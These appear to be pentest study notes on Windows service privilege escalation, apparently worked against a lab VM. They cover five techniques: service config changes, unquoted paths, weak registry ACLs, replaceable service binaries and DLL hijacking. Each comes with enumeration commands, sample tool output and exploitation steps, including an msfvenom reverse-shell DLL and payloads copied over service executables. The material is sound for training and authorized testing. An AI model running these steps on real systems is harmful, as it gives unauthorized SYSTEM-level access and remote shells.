#windows #privesc #services #cmd #registry

## Introduction 

Services are simply programs that run in the background  , accepting input or performing regular tasks.

If services run with SYSTEM privileges and are misconfigured , exploiting theme may lead to command execution with SYSTEM privileges as well.


# Services Commands

##### Query the configuration of a service :

```cmd
sc.exe qc <name>
```

```powershell 
Get-WmiObject win32_service | Where-Object { $_.Name -eq "<name>" }
```

#### Query the current status of a service :

```cmd
sc.exe query <name>
```

```powershell
Get-Service -Name <name>
```

#### Modify a configuration option of a service :

```cmd
sc.exe config <name> <option>= <value>
```

```powershell
Get-Service -Name <name> -StartupType <Manual|Automatic|Disabled>
```

#### Start / Stop a service :

```cmd
net start/stop <name>
```

```powershell
Start-Service -Name <name>
Stop-Service -Name <name>
```



---
---



#  ==1 - Insecure Service Properties==

If our user has permission to change the configuration of a service which runs with SYSTEM privileges , we can change the executable service and use to one of our own.

<span class="red-text">Potential Rabbit Hole :</span>
If you can change a service configuration but cannot stop/start the service, you may not be able to escalate privileges 

```powershell
.\winPEASany.exe servicesinfo
```

##### *Exemple of winPEAS out :*

```bash
[+] Interesting Services -non Microsoft-(T1007)
    daclsvc(DACL Service)["C:\Program Files\DACL Service\daclservice.exe"] -         Manual - Stopped
    YOU CAN MODIFY THIS SERVICE: WriteData/CreateFiles
```

We can see in Modifiable Services also in LinPEAS out :

```bash
[+] Modifiable Services(T1007)
    LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:
    daclsvc: WriteData/CreateFiles
```


##    I - Verify permissions with accesscheck 

```cmd
.\accesschk.exe /accepteula -uwcqv <user> <ServiceName>
```

Verify with cmd:
```cmd
sc sdshow <Nom_du_Service>
```


Verify with Powershell : 
```powershell
Get-Service -Name <Nom_du_Service>
(Get-Acl "HKLM:\SYSTEM\CurrentControlSet\Services\<Nom_du_Service>").Access

```

#### Exemple with DaclSvc service :
```cmd
C:\Tools>.\accesschk.exe /accepteula -uwcqv user daclsvc
.\accesschk.exe /accepteula -uwcqv user daclsvc
RW daclsvc
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_CHANGE_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_START
        SERVICE_STOP
        READ_CONTROL
```


Query the service :
```cmd
sc qc daclsvc

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\DACL Service\daclservice.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem


```

##    II - Query the service 

```cmd
sc qc <serviceName>
```

```powershell
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\<SerName>" -Name ImagePath
```

Verify <span class="red-text">START_TYPE</span> , <span class="red-text">BINARY_PATH_NAME</span> and <span class="red-text">SERVICE_START_NAME</span>

Check the current status of a service :
```cmd
sc query <ServiceName>
```

Check the <span class="red-text">STATE</span>


##    III - Change Binary Path 


```cmd
sc config <ServiceName> binpath= "\"C:\folder\malicous.exe\""
```

```powershell
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\<Nom_du_Service>" -Name ImagePath -Value "C:\Nouveau\Chemin\executable.exe"
```



Now Start the service 

```cmd
net start <ServiceName>
```
```powershell
Start-Service -Name <ServiceName>
```


---
--- 


#  ==**2 - Unquoted Service Path**==
 
Executables in Windows can be run without using their extension ( e.g. "whoami.exe" can be run by just typing "whoami" ).

Some executables take arguments, separated by spaces , e.g someprog.exe arg1 arg2 arg3 
This behavior leads to ambiguity when using absolute paths that are unquoted and contain spaces.

Command Powershell to find unquoted paths :

```powershell
Get-WmiObject win32_service | Where-Object { $_.PathName -like "* *" -and $_.PathName -notlike '"*"' } | Select-Object Name, PathName

```

##### *Exemples of WinPeas Out :*


```bash

unquotedsvc(Unquoted Path Service)[C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe] - Manual - Stopped - ==No quotes and Space detected==

```


##    I - Verify permissions with accesschk

```cmd
.\accesschk.exe /accepteula -ucqv <user> <ServiceName>
```

##    II - Verify ACL on each directory on the Bin Path 


With accesschk 
```cmd
.\accesschk.exe /accepteula -uwdq C:\
.\accesschk.exe /accepteula -uwdq "C:\Program File\"
.\accesschk.exe /accepteula -uwdq "C:\Program File\Unquoted Path Serice\"
```

With icacls  
```cmd
icacls "C:\Program Files\Unquoted Path Service"
```

With PowerShell 
```powershell
(Get-Acl "C:\Program Files\Unquoted Path Service").Access
```

##    III - Copy Payload to the directory 

```cmd
copy reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
```

And Run the service

--- 
--- 

#  ==3 - Weak Registry Permissions==

The Windows registry store entries for each services. 
Since registry entries can have ACLs, if the ACL is misconfigured , it may be possible to modify a service's configuration even if we cannot modify the service directly.

Each service's configuration is in the registry :

```cmd
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\<Service_Name>
```

##### Exemple of WinPeas out 

```bash
[+] Looking if you can modify any service registry()
[?] Check if you can modify the registry of a service 
HKLM\system\currentcontrolset\services\regsvc (Interactive [TakeOwnership])
```











##    I - Verify permissions with Powershell or accesscheck 


```cmd
.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
```


```powershell
powershell -exec bypass

Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List

```

With Powershell the output are SDDL ( See on Internet to read it )

Note : NT AUTHORIY\INTERACTIVE group has full control over the registry entry.
This is a pseudo-group comprised of all users who can log onto the system locally, which includes users.




##    II - Verify if we can start the service 

```cmd
.\accesschk.exe /accepteula -ucqv <user> <Service_Name>
```


##    III - Check current values in registry entries

```cmd
reg query HKLM\SYSTEM\CurentControlSet\services\<Service_Name>
```

##### Exemple of values in the registry for a service 

```cmd
reg query HKLM\SYSTEM\CurrentControlSet\services\regsvc

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\regsvc
Type    REG_DWORD    0x10
Start    REG_DWORD    0x3
ErrorControl    REG_DWORD    0x1
ImagePath    REG_EXPAND_SZ    "C:\Program Files\Insecure Registry   Service\insecureregistryservice.exe"
DisplayName    REG_SZ    Insecure Registry Service
ObjectName    REG_SZ     LocalSystem
```


##    VI - Overwrite ImagePath value in the services register entry 

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\services\<Service_Name> /v ImagePath /t REG_EXPAND_SZ /d C:\folder\payload.exe /f
```

And we start the service 
```cmd
net start <Service_Name>
```

---
---

#  ==4 - Insecure Service Executables==

If the original service executable is modifiable by our user , we can simply replace it with our reverse shell executable.

Remember to create a backup of the original executable if you are exploiting in a real system !

##### Exemple WinPeas out :

```bash
filepermsvc(File Permissions Service)["C:\Program Files\File Permissions Service\filepermservice.exe"] - Manual - Stopped
File Permissions: Everyone [AllAccess]
```


##    I - Verify the ACL of the service executable 

```cmd
.\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
```

##### Exemple of out of accesscheck 

```cmd
C:\Program Files\File Permissions Service\filepermservice.exe
  Medium Mandatory Level (Default) [No-Write-Up]
  RW Everyone
		    FILE_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
		    FILE_ALL_ACCESS
  RW BUILTIN\Administrators
		     FILE_ALL_ACCESS
  RW BUILTIN\Users
             FILE_ALL_ACCESS

```




##    II - Check if we can start and stop the service 

```cmd
.\accesschk.exe /accepteula -uvqc <Service_Name>
```

##### Exemple of out of accesscheck 

```cmd
filepermsvc
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  R  Everyone
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_START
        SERVICE_STOP
        READ_CONTROL
```


##    III - Backup the original service executable 

```cmd 
copy "C:\Program Files\File Permissions Service\filepermservice.exe" C:\temp
```

##    VI -Overwrite the original service executable with payload

```cmd
copy /Y C:\Tools\myshells\shell.exe "C:\Program Files\file Permissions Service\filepermservice.exe"
```

And start the service

```cmd
net start filepermsvc
```

---
---

#  ==5 - DLL Hijacking==

Often a service will try to load functionality from a library called a DLL.
Whatever functionality the DLL provides , will be executed with the same privileges as the service that loaded it.

If a DLL is loaded with an absolute path, it might be possible to escalate privileges if that DLL is writable by our user.

A more common mis-configuration that can be used to escalate privileges is if a DLL is missing from the system, and our user has write access to a directory within the PATH that Windows searches for DLL in.

Unfortunately , initial detection of vulnerable service is difficult , and often the entire process is very manual.

###### *WinPeas out analysis* 

```bash
[+] Interesting Services -non Microsoft-(T1007)

...<SNIP>... <== ENUMERING THIS SERVICES to see START AND STOP FOR user 

[+] Checking write permissions in PATH folders (DLL Hijacking)()

C:\Windows\system32
C:\Windows
C:\Windows\System32\Wbem
C:\Windows\System32\WindowsPowerShell\v1.0\
C:\Windows\System32\OpenSSH\
C:\Users\MSEDGEWIN\AppData\Local\Microsoft\WindowsApps
(DLL Hijacking) C:\Temp: Authenticated Users [WriteData/CreateFiles]

```

*Exemple of %PATH% on Windows 10* 

```cmd

C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\MSEDGEWIN\AppData\Local\Microsoft\WindowsApps;C:\Temp;;C:\Temp;C:\Users\user\AppData\Local\Microsoft\WindowsApps;
```

## I - Enumerating Services user has stop and start access to

*Exemple of service in WinPeas* 

```bash
dllsvc(DLL Hijack Service)["C:\Program Files\DLL Hijack Service\dllhijackservice.exe"] - Manual - Stopped
```

```cmd
.\accesschk.exe /accepteula -uvqc <user> <Service_Name>
```

If we have the permission to start and stop the service we can investigate

```cmd
sc qc <Service_Name>
```

#### *Output of this command* 

```cmd
sc qc dllsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: dllsvc
TYPE               : 10  WIN32_OWN_PROCESS 
TART_TYPE         : 3   DEMAND_START
ERROR_CONTROL      : 1   NORMAL
BINARY_PATH_NAME   : "C:\Program Files\DLL Hijack Service\dllhijackservice.exe"
LOAD_ORDER_GROUP   : 
TAG                : 0
DISPLAY_NAME       : DLL Hijack Service
DEPENDENCIES       : 
SERVICE_START_NAME : LocalSystem
```

In a real engagement we would copy the service executable off the host and onto a machine where we have admin rights for analysis.

Here we use admin account on the target machine to analyze the file.


## II - Analyze the Service executable 

Run Procmon64.exe with administrator's privileges 

Stop and Clear the current capture ( you have a blank windows now )

Press Control + L to open the filter configuration and add a new filter on the process 

![[procmonfilter.PNG]]

Click add 

![[deselctprocmon.PNG]]

Deselect the show registry activity and show networked activity and start the capture again.

On regular command prompt start the service 

```cmd
net start dllsvc
```


We can see NAME NOT FOUND 

![[analysisprocmon.PNG]]

because hijackme.dll is not found  

![[hijackdllprocmon.PNG]]

This shows windows going through each directory in the DLL search order to try and find the file.

At some point , Windows try to find in the C:\Temp\ directory , which , as found earlier , is writable by a simple user 


## III - Generate payload in the format set to deal with

with msfvenom , we'll generate a reverse shell in DLL format 

```bach
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=53 -f dll > hijackme.dll
```

We copy this in C:\Temp\ directory.

We Stop and Start the service 

```cmd
net stop dllsvc

net start dllsvc
```


